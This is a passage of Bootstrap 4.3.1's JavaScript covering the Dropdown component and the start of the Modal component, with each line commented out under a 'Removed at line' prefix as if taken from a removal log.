// Removed at line 1240:   var ARROW_DOWN_KEYCODE = 40; // KeyboardEvent.which value for down arrow key
// Removed at line 1241:   var RIGHT_MOUSE_BUTTON_WHICH = 3; // MouseEvent.which value for the right button (assuming a right-handed mouse)
// Removed at line 1242:   var REGEXP_KEYDOWN = new RegExp(ARROW_UP_KEYCODE + "|" + ARROW_DOWN_KEYCODE + "|" + ESCAPE_KEYCODE);
// Removed at line 1243:   var Event$4 = {
// Removed at line 1244:     HIDE: "hide" + EVENT_KEY$4,
// Removed at line 1245:     HIDDEN: "hidden" + EVENT_KEY$4,
// Removed at line 1246:     SHOW: "show" + EVENT_KEY$4,
// Removed at line 1247:     SHOWN: "shown" + EVENT_KEY$4,
// Removed at line 1248:     CLICK: "click" + EVENT_KEY$4,
// Removed at line 1249:     CLICK_DATA_API: "click" + EVENT_KEY$4 + DATA_API_KEY$4,
// Removed at line 1250:     KEYDOWN_DATA_API: "keydown" + EVENT_KEY$4 + DATA_API_KEY$4,
// Removed at line 1251:     KEYUP_DATA_API: "keyup" + EVENT_KEY$4 + DATA_API_KEY$4
// Removed at line 1252:   };
// Removed at line 1253:   var ClassName$4 = {
// Removed at line 1254:     DISABLED: 'disabled',
// Removed at line 1255:     SHOW: 'show',
// Removed at line 1256:     DROPUP: 'dropup',
// Removed at line 1257:     DROPRIGHT: 'dropright',
// Removed at line 1258:     DROPLEFT: 'dropleft',
// Removed at line 1259:     MENURIGHT: 'dropdown-menu-right',
// Removed at line 1260:     MENULEFT: 'dropdown-menu-left',
// Removed at line 1261:     POSITION_STATIC: 'position-static'
// Removed at line 1262:   };
// Removed at line 1263:   var Selector$4 = {
// Removed at line 1264:     DATA_TOGGLE: '[data-toggle="dropdown"]',
// Removed at line 1265:     FORM_CHILD: '.dropdown form',
// Removed at line 1266:     MENU: '.dropdown-menu',
// Removed at line 1267:     NAVBAR_NAV: '.navbar-nav',
// Removed at line 1268:     VISIBLE_ITEMS: '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'
// Removed at line 1269:   };
// Removed at line 1270:   var AttachmentMap = {
// Removed at line 1271:     TOP: 'top-start',
// Removed at line 1272:     TOPEND: 'top-end',
// Removed at line 1273:     BOTTOM: 'bottom-start',
// Removed at line 1274:     BOTTOMEND: 'bottom-end',
// Removed at line 1275:     RIGHT: 'right-start',
// Removed at line 1276:     RIGHTEND: 'right-end',
// Removed at line 1277:     LEFT: 'left-start',
// Removed at line 1278:     LEFTEND: 'left-end'
// Removed at line 1279:   };
// Removed at line 1280:   var Default$2 = {
// Removed at line 1281:     offset: 0,
// Removed at line 1282:     flip: true,
// Removed at line 1283:     boundary: 'scrollParent',
// Removed at line 1284:     reference: 'toggle',
// Removed at line 1285:     display: 'dynamic'
// Removed at line 1286:   };
// Removed at line 1287:   var DefaultType$2 = {
// Removed at line 1288:     offset: '(number|string|function)',
// Removed at line 1289:     flip: 'boolean',
// Removed at line 1290:     boundary: '(string|element)',
// Removed at line 1291:     reference: '(string|element)',
// Removed at line 1292:     display: 'string'
// Removed at line 1293:     /**
// Removed at line 1294:      * ------------------------------------------------------------------------
// Removed at line 1295:      * Class Definition
// Removed at line 1296:      * ------------------------------------------------------------------------
// Removed at line 1297:      */
// Removed at line 1298:   };
// Removed at line 1299:   var Dropdown =
// Removed at line 1300:     /*#__PURE__*/
// Removed at line 1301:     function () {
// Removed at line 1302:       function Dropdown(element, config) {
// Removed at line 1303:         this._element = element;
// Removed at line 1304:         this._popper = null;
// Removed at line 1305:         this._config = this._getConfig(config);
// Removed at line 1306:         this._menu = this._getMenuElement();
// Removed at line 1307:         this._inNavbar = this._detectNavbar();
// Removed at line 1308:         this._addEventListeners();
// Removed at line 1309:       } // Getters
// Removed at line 1310:       var _proto = Dropdown.prototype;
// Removed at line 1311:       // Public
// Removed at line 1312:       _proto.toggle = function toggle() {
// Removed at line 1313:         if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED)) {
// Removed at line 1314:           return;
// Removed at line 1315:         }
// Removed at line 1316:         var parent = Dropdown._getParentFromElement(this._element);
// Removed at line 1317:         var isActive = $(this._menu).hasClass(ClassName$4.SHOW);
// Removed at line 1318:         Dropdown._clearMenus();
// Removed at line 1319:         if (isActive) {
// Removed at line 1320:           return;
// Removed at line 1321:         }
// Removed at line 1322:         var relatedTarget = {
// Removed at line 1323:           relatedTarget: this._element
// Removed at line 1324:         };
// Removed at line 1325:         var showEvent = $.Event(Event$4.SHOW, relatedTarget);
// Removed at line 1326:         $(parent).trigger(showEvent);
// Removed at line 1327:         if (showEvent.isDefaultPrevented()) {
// Removed at line 1328:           return;
// Removed at line 1329:         } // Disable totally Popper.js for Dropdown in Navbar
// Removed at line 1330:         if (!this._inNavbar) {
// Removed at line 1331:           /**
// Removed at line 1332:            * Check for Popper dependency
// Removed at line 1333:            * Popper - https://popper.js.org
// Removed at line 1334:            */
// Removed at line 1335:           if (typeof Popper === 'undefined') {
// Removed at line 1336:             throw new TypeError('Bootstrap\'s dropdowns require Popper.js (https://popper.js.org/)');
// Removed at line 1337:           }
// Removed at line 1338:           var referenceElement = this._element;
// Removed at line 1339:           if (this._config.reference === 'parent') {
// Removed at line 1340:             referenceElement = parent;
// Removed at line 1341:           } else if (Util.isElement(this._config.reference)) {
// Removed at line 1342:             referenceElement = this._config.reference; // Check if it's jQuery element
// Removed at line 1343:             if (typeof this._config.reference.jquery !== 'undefined') {
// Removed at line 1344:               referenceElement = this._config.reference[0];
// Removed at line 1345:             }
// Removed at line 1346:           } // If boundary is not `scrollParent`, then set position to `static`
// Removed at line 1347:           // to allow the menu to "escape" the scroll parent's boundaries
// Removed at line 1348:           // https://github.com/twbs/bootstrap/issues/24251
// Removed at line 1349:           if (this._config.boundary !== 'scrollParent') {
// Removed at line 1350:             $(parent).addClass(ClassName$4.POSITION_STATIC);
// Removed at line 1351:           }
// Removed at line 1352:           this._popper = new Popper(referenceElement, this._menu, this._getPopperConfig());
// Removed at line 1353:         } // If this is a touch-enabled device we add extra
// Removed at line 1354:         // empty mouseover listeners to the body's immediate children;
// Removed at line 1355:         // only needed because of broken event delegation on iOS
// Removed at line 1356:         // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html
// Removed at line 1357:         if ('ontouchstart' in document.documentElement && $(parent).closest(Selector$4.NAVBAR_NAV).length === 0) {
// Removed at line 1358:           $(document.body).children().on('mouseover', null, $.noop);
// Removed at line 1359:         }
// Removed at line 1360:         this._element.focus();
// Removed at line 1361:         this._element.setAttribute('aria-expanded', true);
// Removed at line 1362:         $(this._menu).toggleClass(ClassName$4.SHOW);
// Removed at line 1363:         $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.SHOWN, relatedTarget));
// Removed at line 1364:       };
// Removed at line 1365:       _proto.show = function show() {
// Removed at line 1366:         if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED) || $(this._menu).hasClass(ClassName$4.SHOW)) {
// Removed at line 1367:           return;
// Removed at line 1368:         }
// Removed at line 1369:         var relatedTarget = {
// Removed at line 1370:           relatedTarget: this._element
// Removed at line 1371:         };
// Removed at line 1372:         var showEvent = $.Event(Event$4.SHOW, relatedTarget);
// Removed at line 1373:         var parent = Dropdown._getParentFromElement(this._element);
// Removed at line 1374:         $(parent).trigger(showEvent);
// Removed at line 1375:         if (showEvent.isDefaultPrevented()) {
// Removed at line 1376:           return;
// Removed at line 1377:         }
// Removed at line 1378:         $(this._menu).toggleClass(ClassName$4.SHOW);
// Removed at line 1379:         $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.SHOWN, relatedTarget));
// Removed at line 1380:       };
// Removed at line 1381:       _proto.hide = function hide() {
// Removed at line 1382:         if (this._element.disabled || $(this._element).hasClass(ClassName$4.DISABLED) || !$(this._menu).hasClass(ClassName$4.SHOW)) {
// Removed at line 1383:           return;
// Removed at line 1384:         }
// Removed at line 1385:         var relatedTarget = {
// Removed at line 1386:           relatedTarget: this._element
// Removed at line 1387:         };
// Removed at line 1388:         var hideEvent = $.Event(Event$4.HIDE, relatedTarget);
// Removed at line 1389:         var parent = Dropdown._getParentFromElement(this._element);
// Removed at line 1390:         $(parent).trigger(hideEvent);
// Removed at line 1391:         if (hideEvent.isDefaultPrevented()) {
// Removed at line 1392:           return;
// Removed at line 1393:         }
// Removed at line 1394:         $(this._menu).toggleClass(ClassName$4.SHOW);
// Removed at line 1395:         $(parent).toggleClass(ClassName$4.SHOW).trigger($.Event(Event$4.HIDDEN, relatedTarget));
// Removed at line 1396:       };
// Removed at line 1397:       _proto.dispose = function dispose() {
// Removed at line 1398:         $.removeData(this._element, DATA_KEY$4);
// Removed at line 1399:         $(this._element).off(EVENT_KEY$4);
// Removed at line 1400:         this._element = null;
// Removed at line 1401:         this._menu = null;
// Removed at line 1402:         if (this._popper !== null) {
// Removed at line 1403:           this._popper.destroy();
// Removed at line 1404:           this._popper = null;
// Removed at line 1405:         }
// Removed at line 1406:       };
// Removed at line 1407:       _proto.update = function update() {
// Removed at line 1408:         this._inNavbar = this._detectNavbar();
// Removed at line 1409:         if (this._popper !== null) {
// Removed at line 1410:           this._popper.scheduleUpdate();
// Removed at line 1411:         }
// Removed at line 1412:       } // Private
// Removed at line 1413:         ;
// Removed at line 1414:       _proto._addEventListeners = function _addEventListeners() {
// Removed at line 1415:         var _this = this;
// Removed at line 1416:         $(this._element).on(Event$4.CLICK, function (event) {
// Removed at line 1417:           event.preventDefault();
// Removed at line 1418:           event.stopPropagation();
// Removed at line 1419:           _this.toggle();
// Removed at line 1420:         });
// Removed at line 1421:       };
// Removed at line 1422:       _proto._getConfig = function _getConfig(config) {
// Removed at line 1423:         config = _objectSpread({}, this.constructor.Default, $(this._element).data(), config);
// Removed at line 1424:         Util.typeCheckConfig(NAME$4, config, this.constructor.DefaultType);
// Removed at line 1425:         return config;
// Removed at line 1426:       };
// Removed at line 1427:       _proto._getMenuElement = function _getMenuElement() {
// Removed at line 1428:         if (!this._menu) {
// Removed at line 1429:           var parent = Dropdown._getParentFromElement(this._element);
// Removed at line 1430:           if (parent) {
// Removed at line 1431:             this._menu = parent.querySelector(Selector$4.MENU);
// Removed at line 1432:           }
// Removed at line 1433:         }
// Removed at line 1434:         return this._menu;
// Removed at line 1435:       };
// Removed at line 1436:       _proto._getPlacement = function _getPlacement() {
// Removed at line 1437:         var $parentDropdown = $(this._element.parentNode);
// Removed at line 1438:         var placement = AttachmentMap.BOTTOM; // Handle dropup
// Removed at line 1439:         if ($parentDropdown.hasClass(ClassName$4.DROPUP)) {
// Removed at line 1440:           placement = AttachmentMap.TOP;
// Removed at line 1441:           if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {
// Removed at line 1442:             placement = AttachmentMap.TOPEND;
// Removed at line 1443:           }
// Removed at line 1444:         } else if ($parentDropdown.hasClass(ClassName$4.DROPRIGHT)) {
// Removed at line 1445:           placement = AttachmentMap.RIGHT;
// Removed at line 1446:         } else if ($parentDropdown.hasClass(ClassName$4.DROPLEFT)) {
// Removed at line 1447:           placement = AttachmentMap.LEFT;
// Removed at line 1448:         } else if ($(this._menu).hasClass(ClassName$4.MENURIGHT)) {
// Removed at line 1449:           placement = AttachmentMap.BOTTOMEND;
// Removed at line 1450:         }
// Removed at line 1451:         return placement;
// Removed at line 1452:       };
// Removed at line 1453:       _proto._detectNavbar = function _detectNavbar() {
// Removed at line 1454:         return $(this._element).closest('.navbar').length > 0;
// Removed at line 1455:       };
// Removed at line 1456:       _proto._getOffset = function _getOffset() {
// Removed at line 1457:         var _this2 = this;
// Removed at line 1458:         var offset = {};
// Removed at line 1459:         if (typeof this._config.offset === 'function') {
// Removed at line 1460:           offset.fn = function (data) {
// Removed at line 1461:             data.offsets = _objectSpread({}, data.offsets, _this2._config.offset(data.offsets, _this2._element) || {});
// Removed at line 1462:             return data;
// Removed at line 1463:           };
// Removed at line 1464:         } else {
// Removed at line 1465:           offset.offset = this._config.offset;
// Removed at line 1466:         }
// Removed at line 1467:         return offset;
// Removed at line 1468:       };
// Removed at line 1469:       _proto._getPopperConfig = function _getPopperConfig() {
// Removed at line 1470:         var popperConfig = {
// Removed at line 1471:           placement: this._getPlacement(),
// Removed at line 1472:           modifiers: {
// Removed at line 1473:             offset: this._getOffset(),
// Removed at line 1474:             flip: {
// Removed at line 1475:               enabled: this._config.flip
// Removed at line 1476:             },
// Removed at line 1477:             preventOverflow: {
// Removed at line 1478:               boundariesElement: this._config.boundary
// Removed at line 1479:             }
// Removed at line 1480:           } // Disable Popper.js if we have a static display
// Removed at line 1481:         };
// Removed at line 1482:         if (this._config.display === 'static') {
// Removed at line 1483:           popperConfig.modifiers.applyStyle = {
// Removed at line 1484:             enabled: false
// Removed at line 1485:           };
// Removed at line 1486:         }
// Removed at line 1487:         return popperConfig;
// Removed at line 1488:       } // Static
// Removed at line 1489:         ;
// Removed at line 1490:       Dropdown._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 1491:         return this.each(function () {
// Removed at line 1492:           var data = $(this).data(DATA_KEY$4);
// Removed at line 1493:           var _config = typeof config === 'object' ? config : null;
// Removed at line 1494:           if (!data) {
// Removed at line 1495:             data = new Dropdown(this, _config);
// Removed at line 1496:             $(this).data(DATA_KEY$4, data);
// Removed at line 1497:           }
// Removed at line 1498:           if (typeof config === 'string') {
// Removed at line 1499:             if (typeof data[config] === 'undefined') {
// Removed at line 1500:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 1501:             }
// Removed at line 1502:             data[config]();
// Removed at line 1503:           }
// Removed at line 1504:         });
// Removed at line 1505:       };
// Removed at line 1506:       Dropdown._clearMenus = function _clearMenus(event) {
// Removed at line 1507:         if (event && (event.which === RIGHT_MOUSE_BUTTON_WHICH || event.type === 'keyup' && event.which !== TAB_KEYCODE)) {
// Removed at line 1508:           return;
// Removed at line 1509:         }
// Removed at line 1510:         var toggles = [].slice.call(document.querySelectorAll(Selector$4.DATA_TOGGLE));
// Removed at line 1511:         for (var i = 0, len = toggles.length; i < len; i++) {
// Removed at line 1512:           var parent = Dropdown._getParentFromElement(toggles[i]);
// Removed at line 1513:           var context = $(toggles[i]).data(DATA_KEY$4);
// Removed at line 1514:           var relatedTarget = {
// Removed at line 1515:             relatedTarget: toggles[i]
// Removed at line 1516:           };
// Removed at line 1517:           if (event && event.type === 'click') {
// Removed at line 1518:             relatedTarget.clickEvent = event;
// Removed at line 1519:           }
// Removed at line 1520:           if (!context) {
// Removed at line 1521:             continue;
// Removed at line 1522:           }
// Removed at line 1523:           var dropdownMenu = context._menu;
// Removed at line 1524:           if (!$(parent).hasClass(ClassName$4.SHOW)) {
// Removed at line 1525:             continue;
// Removed at line 1526:           }
// Removed at line 1527:           if (event && (event.type === 'click' && /input|textarea/i.test(event.target.tagName) || event.type === 'keyup' && event.which === TAB_KEYCODE) && $.contains(parent, event.target)) {
// Removed at line 1528:             continue;
// Removed at line 1529:           }
// Removed at line 1530:           var hideEvent = $.Event(Event$4.HIDE, relatedTarget);
// Removed at line 1531:           $(parent).trigger(hideEvent);
// Removed at line 1532:           if (hideEvent.isDefaultPrevented()) {
// Removed at line 1533:             continue;
// Removed at line 1534:           } // If this is a touch-enabled device we remove the extra
// Removed at line 1535:           // empty mouseover listeners we added for iOS support
// Removed at line 1536:           if ('ontouchstart' in document.documentElement) {
// Removed at line 1537:             $(document.body).children().off('mouseover', null, $.noop);
// Removed at line 1538:           }
// Removed at line 1539:           toggles[i].setAttribute('aria-expanded', 'false');
// Removed at line 1540:           $(dropdownMenu).removeClass(ClassName$4.SHOW);
// Removed at line 1541:           $(parent).removeClass(ClassName$4.SHOW).trigger($.Event(Event$4.HIDDEN, relatedTarget));
// Removed at line 1542:         }
// Removed at line 1543:       };
// Removed at line 1544:       Dropdown._getParentFromElement = function _getParentFromElement(element) {
// Removed at line 1545:         var parent;
// Removed at line 1546:         var selector = Util.getSelectorFromElement(element);
// Removed at line 1547:         if (selector) {
// Removed at line 1548:           parent = document.querySelector(selector);
// Removed at line 1549:         }
// Removed at line 1550:         return parent || element.parentNode;
// Removed at line 1551:       } // eslint-disable-next-line complexity
// Removed at line 1552:         ;
// Removed at line 1553:       Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {
// Removed at line 1554:         // If not input/textarea:
// Removed at line 1555:         //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
// Removed at line 1556:         // If input/textarea:
// Removed at line 1557:         //  - If space key => not a dropdown command
// Removed at line 1558:         //  - If key is other than escape
// Removed at line 1559:         //    - If key is not up or down => not a dropdown command
// Removed at line 1560:         //    - If trigger inside the menu => not a dropdown command
// Removed at line 1561:         if (/input|textarea/i.test(event.target.tagName) ? event.which === SPACE_KEYCODE || event.which !== ESCAPE_KEYCODE && (event.which !== ARROW_DOWN_KEYCODE && event.which !== ARROW_UP_KEYCODE || $(event.target).closest(Selector$4.MENU).length) : !REGEXP_KEYDOWN.test(event.which)) {
// Removed at line 1562:           return;
// Removed at line 1563:         }
// Removed at line 1564:         event.preventDefault();
// Removed at line 1565:         event.stopPropagation();
// Removed at line 1566:         if (this.disabled || $(this).hasClass(ClassName$4.DISABLED)) {
// Removed at line 1567:           return;
// Removed at line 1568:         }
// Removed at line 1569:         var parent = Dropdown._getParentFromElement(this);
// Removed at line 1570:         var isActive = $(parent).hasClass(ClassName$4.SHOW);
// Removed at line 1571:         if (!isActive || isActive && (event.which === ESCAPE_KEYCODE || event.which === SPACE_KEYCODE)) {
// Removed at line 1572:           if (event.which === ESCAPE_KEYCODE) {
// Removed at line 1573:             var toggle = parent.querySelector(Selector$4.DATA_TOGGLE);
// Removed at line 1574:             $(toggle).trigger('focus');
// Removed at line 1575:           }
// Removed at line 1576:           $(this).trigger('click');
// Removed at line 1577:           return;
// Removed at line 1578:         }
// Removed at line 1579:         var items = [].slice.call(parent.querySelectorAll(Selector$4.VISIBLE_ITEMS));
// Removed at line 1580:         if (items.length === 0) {
// Removed at line 1581:           return;
// Removed at line 1582:         }
// Removed at line 1583:         var index = items.indexOf(event.target);
// Removed at line 1584:         if (event.which === ARROW_UP_KEYCODE && index > 0) {
// Removed at line 1585:           // Up
// Removed at line 1586:           index--;
// Removed at line 1587:         }
// Removed at line 1588:         if (event.which === ARROW_DOWN_KEYCODE && index < items.length - 1) {
// Removed at line 1589:           // Down
// Removed at line 1590:           index++;
// Removed at line 1591:         }
// Removed at line 1592:         if (index < 0) {
// Removed at line 1593:           index = 0;
// Removed at line 1594:         }
// Removed at line 1595:         items[index].focus();
// Removed at line 1596:       };
// Removed at line 1597:       _createClass(Dropdown, null, [{
// Removed at line 1598:         key: "VERSION",
// Removed at line 1599:         get: function get() {
// Removed at line 1600:           return VERSION$4;
// Removed at line 1601:         }
// Removed at line 1602:       }, {
// Removed at line 1603:         key: "Default",
// Removed at line 1604:         get: function get() {
// Removed at line 1605:           return Default$2;
// Removed at line 1606:         }
// Removed at line 1607:       }, {
// Removed at line 1608:         key: "DefaultType",
// Removed at line 1609:         get: function get() {
// Removed at line 1610:           return DefaultType$2;
// Removed at line 1611:         }
// Removed at line 1612:       }]);
// Removed at line 1613:       return Dropdown;
// Removed at line 1614:     }();
// Removed at line 1615:   /**
// Removed at line 1616:    * ------------------------------------------------------------------------
// Removed at line 1617:    * Data Api implementation
// Removed at line 1618:    * ------------------------------------------------------------------------
// Removed at line 1619:    */
// Removed at line 1620:   $(document).on(Event$4.KEYDOWN_DATA_API, Selector$4.DATA_TOGGLE, Dropdown._dataApiKeydownHandler).on(Event$4.KEYDOWN_DATA_API, Selector$4.MENU, Dropdown._dataApiKeydownHandler).on(Event$4.CLICK_DATA_API + " " + Event$4.KEYUP_DATA_API, Dropdown._clearMenus).on(Event$4.CLICK_DATA_API, Selector$4.DATA_TOGGLE, function (event) {
// Removed at line 1621:     event.preventDefault();
// Removed at line 1622:     event.stopPropagation();
// Removed at line 1623:     Dropdown._jQueryInterface.call($(this), 'toggle');
// Removed at line 1624:   }).on(Event$4.CLICK_DATA_API, Selector$4.FORM_CHILD, function (e) {
// Removed at line 1625:     e.stopPropagation();
// Removed at line 1626:   });
// Removed at line 1627:   /**
// Removed at line 1628:    * ------------------------------------------------------------------------
// Removed at line 1629:    * jQuery
// Removed at line 1630:    * ------------------------------------------------------------------------
// Removed at line 1631:    */
// Removed at line 1632:   $.fn[NAME$4] = Dropdown._jQueryInterface;
// Removed at line 1633:   $.fn[NAME$4].Constructor = Dropdown;
// Removed at line 1634:   $.fn[NAME$4].noConflict = function () {
// Removed at line 1635:     $.fn[NAME$4] = JQUERY_NO_CONFLICT$4;
// Removed at line 1636:     return Dropdown._jQueryInterface;
// Removed at line 1637:   };
// Removed at line 1638:   /**
// Removed at line 1639:    * ------------------------------------------------------------------------
// Removed at line 1640:    * Constants
// Removed at line 1641:    * ------------------------------------------------------------------------
// Removed at line 1642:    */
// Removed at line 1643:   var NAME$5 = 'modal';
// Removed at line 1644:   var VERSION$5 = '4.3.1';
// Removed at line 1645:   var DATA_KEY$5 = 'bs.modal';
// Removed at line 1646:   var EVENT_KEY$5 = "." + DATA_KEY$5;
// Removed at line 1647:   var DATA_API_KEY$5 = '.data-api';
// Removed at line 1648:   var JQUERY_NO_CONFLICT$5 = $.fn[NAME$5];
// Removed at line 1649:   var ESCAPE_KEYCODE$1 = 27; // KeyboardEvent.which value for Escape (Esc) key
// Removed at line 1650:   var Default$3 = {
// Removed at line 1651:     backdrop: true,
// Removed at line 1652:     keyboard: true,
// Removed at line 1653:     focus: true,
// Removed at line 1654:     show: true
// Removed at line 1655:   };
// Removed at line 1656:   var DefaultType$3 = {
// Removed at line 1657:     backdrop: '(boolean|string)',
// Removed at line 1658:     keyboard: 'boolean',
// Removed at line 1659:     focus: 'boolean',
// Removed at line 1660:     show: 'boolean'
// Removed at line 1661:   };
// Removed at line 1662:   var Event$5 = {
// Removed at line 1663:     HIDE: "hide" + EVENT_KEY$5,
// Removed at line 1664:     HIDDEN: "hidden" + EVENT_KEY$5,
// Removed at line 1665:     SHOW: "show" + EVENT_KEY$5,
// Removed at line 1666:     SHOWN: "shown" + EVENT_KEY$5,
// Removed at line 1667:     FOCUSIN: "focusin" + EVENT_KEY$5,
// Removed at line 1668:     RESIZE: "resize" + EVENT_KEY$5,
// Removed at line 1669:     CLICK_DISMISS: "click.dismiss" + EVENT_KEY$5,
// Removed at line 1670:     KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEY$5,
// Removed at line 1671:     MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEY$5,
// Removed at line 1672:     MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEY$5,
// Removed at line 1673:     CLICK_DATA_API: "click" + EVENT_KEY$5 + DATA_API_KEY$5
// Removed at line 1674:   };
// Removed at line 1675:   var ClassName$5 = {
// Removed at line 1676:     SCROLLABLE: 'modal-dialog-scrollable',
// Removed at line 1677:     SCROLLBAR_MEASURER: 'modal-scrollbar-measure',
// Removed at line 1678:     BACKDROP: 'modal-backdrop',
// Removed at line 1679:     OPEN: 'modal-open',
// Removed at line 1680:     FADE: 'fade',
// Removed at line 1681:     SHOW: 'show'
// Removed at line 1682:   };
// Removed at line 1683:   var Selector$5 = {
// Removed at line 1684:     DIALOG: '.modal-dialog',
// Removed at line 1685:     MODAL_BODY: '.modal-body',
// Removed at line 1686:     DATA_TOGGLE: '[data-toggle="modal"]',
// Removed at line 1687:     DATA_DISMISS: '[data-dismiss="modal"]',
// Removed at line 1688:     FIXED_CONTENT: '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',
// Removed at line 1689:     STICKY_CONTENT: '.sticky-top'
// Removed at line 1690:     /**
// Removed at line 1691:      * ------------------------------------------------------------------------
// Removed at line 1692:      * Class Definition
// Removed at line 1693:      * ------------------------------------------------------------------------
// Removed at line 1694:      */
// Removed at line 1695:   };
// Removed at line 1696:   var Modal =
// Removed at line 1697:     /*#__PURE__*/
// Removed at line 1698:     function () {
// Removed at line 1699:       function Modal(element, config) {
// Removed at line 1700:         this._config = this._getConfig(config);
// Removed at line 1701:         this._element = element;
// Removed at line 1702:         this._dialog = element.querySelector(Selector$5.DIALOG);
// Removed at line 1703:         this._backdrop = null;
// Removed at line 1704:         this._isShown = false;
// Removed at line 1705:         this._isBodyOverflowing = false;
// Removed at line 1706:         this._ignoreBackdropClick = false;
// Removed at line 1707:         this._isTransitioning = false;
// Removed at line 1708:         this._scrollbarWidth = 0;
// Removed at line 1709:       } // Getters
// Removed at line 1710:       var _proto = Modal.prototype;
// Removed at line 1711:       // Public
// Removed at line 1712:       _proto.toggle = function toggle(relatedTarget) {
// Removed at line 1713:         return this._isShown ? this.hide() : this.show(relatedTarget);
// Removed at line 1714:       };
// Removed at line 1715:       _proto.show = function show(relatedTarget) {
// Removed at line 1716:         var _this = this;
// Removed at line 1717:         if (this._isShown || this._isTransitioning) {
// Removed at line 1718:           return;
// Removed at line 1719:         }
// Removed at line 1720:         if ($(this._element).hasClass(ClassName$5.FADE)) {
// Removed at line 1721:           this._isTransitioning = true;
// Removed at line 1722:         }
// Removed at line 1723:         var showEvent = $.Event(Event$5.SHOW, {
// Removed at line 1724:           relatedTarget: relatedTarget
// Removed at line 1725:         });
// Removed at line 1726:         $(this._element).trigger(showEvent);
// Removed at line 1727:         if (this._isShown || showEvent.isDefaultPrevented()) {
// Removed at line 1728:           return;
// Removed at line 1729:         }
// Removed at line 1730:         this._isShown = true;
// Removed at line 1731:         this._checkScrollbar();
// Removed at line 1732:         this._setScrollbar();
// Removed at line 1733:         this._adjustDialog();
// Removed at line 1734:         this._setEscapeEvent();
// Removed at line 1735:         this._setResizeEvent();
// Removed at line 1736:         $(this._element).on(Event$5.CLICK_DISMISS, Selector$5.DATA_DISMISS, function (event) {
// Removed at line 1737:           return _this.hide(event);
// Removed at line 1738:         });
// Removed at line 1739:         $(this._dialog).on(Event$5.MOUSEDOWN_DISMISS, function () {
// Removed at line 1740:           $(_this._element).one(Event$5.MOUSEUP_DISMISS, function (event) {
// Removed at line 1741:             if ($(event.target).is(_this._element)) {
// Removed at line 1742:               _this._ignoreBackdropClick = true;
// Removed at line 1743:             }
// Removed at line 1744:           });
// Removed at line 1745:         });
// Removed at line 1746:         this._showBackdrop(function () {
// Removed at line 1747:           return _this._showElement(relatedTarget);
// Removed at line 1748:         });
// Removed at line 1749:       };
// Removed at line 1750:       _proto.hide = function hide(event) {
// Removed at line 1751:         var _this2 = this;
// Removed at line 1752:         if (event) {
// Removed at line 1753:           event.preventDefault();
// Removed at line 1754:         }
// Removed at line 1755:         if (!this._isShown || this._isTransitioning) {
// Removed at line 1756:           return;
// Removed at line 1757:         }
// Removed at line 1758:         var hideEvent = $.Event(Event$5.HIDE);
// Removed at line 1759:         $(this._element).trigger(hideEvent);
// Removed at line 1760:         if (!this._isShown || hideEvent.isDefaultPrevented()) {
// Removed at line 1761:           return;
// Removed at line 1762:         }
// Removed at line 1763:         this._isShown = false;
// Removed at line 1764:         var transition = $(this._element).hasClass(ClassName$5.FADE);
// Removed at line 1765:         if (transition) {
// Removed at line 1766:           this._isTransitioning = true;
// Removed at line 1767:         }
// Removed at line 1768:         this._setEscapeEvent();
// Removed at line 1769:         this._setResizeEvent();
// Removed at line 1770:         $(document).off(Event$5.FOCUSIN);
// Removed at line 1771:         $(this._element).removeClass(ClassName$5.SHOW);
// Removed at line 1772:         $(this._element).off(Event$5.CLICK_DISMISS);
// Removed at line 1773:         $(this._dialog).off(Event$5.MOUSEDOWN_DISMISS);
// Removed at line 1774:         if (transition) {
// Removed at line 1775:           var transitionDuration = Util.getTransitionDurationFromElement(this._element);
// Removed at line 1776:           $(this._element).one(Util.TRANSITION_END, function (event) {
// Removed at line 1777:             return _this2._hideModal(event);
// Removed at line 1778:           }).emulateTransitionEnd(transitionDuration);
// Removed at line 1779:         } else {
// Removed at line 1780:           this._hideModal();
// Removed at line 1781:         }
// Removed at line 1782:       };
// Removed at line 1783:       _proto.dispose = function dispose() {
// Removed at line 1784:         [window, this._element, this._dialog].forEach(function (htmlElement) {
// Removed at line 1785:           return $(htmlElement).off(EVENT_KEY$5);
// Removed at line 1786:         });
// Removed at line 1787:         /**
// Removed at line 1788:          * `document` has 2 events `Event.FOCUSIN` and `Event.CLICK_DATA_API`
// Removed at line 1789:          * Do not move `document` in `htmlElements` array
// Removed at line 1790:          * It will remove `Event.CLICK_DATA_API` event that should remain
// Removed at line 1791:          */
// Removed at line 1792:         $(document).off(Event$5.FOCUSIN);
// Removed at line 1793:         $.removeData(this._element, DATA_KEY$5);
// Removed at line 1794:         this._config = null;
// Removed at line 1795:         this._element = null;
// Removed at line 1796:         this._dialog = null;
// Removed at line 1797:         this._backdrop = null;
// Removed at line 1798:         this._isShown = null;
// Removed at line 1799:         this._isBodyOverflowing = null;
// Removed at line 1800:         this._ignoreBackdropClick = null;
// Removed at line 1801:         this._isTransitioning = null;
// Removed at line 1802:         this._scrollbarWidth = null;
// Removed at line 1803:       };
// Removed at line 1804:       _proto.handleUpdate = function handleUpdate() {
// Removed at line 1805:         this._adjustDialog();
// Removed at line 1806:       } // Private
// Removed at line 1807:         ;
// Removed at line 1808:       _proto._getConfig = function _getConfig(config) {
// Removed at line 1809:         config = _objectSpread({}, Default$3, config);
// Removed at line 1810:         Util.typeCheckConfig(NAME$5, config, DefaultType$3);
// Removed at line 1811:         return config;
// Removed at line 1812:       };
// Removed at line 1813:       _proto._showElement = function _showElement(relatedTarget) {
// Removed at line 1814:         var _this3 = this;
// Removed at line 1815:         var transition = $(this._element).hasClass(ClassName$5.FADE);
// Removed at line 1816:         if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
// Removed at line 1817:           // Don't move modal's DOM position
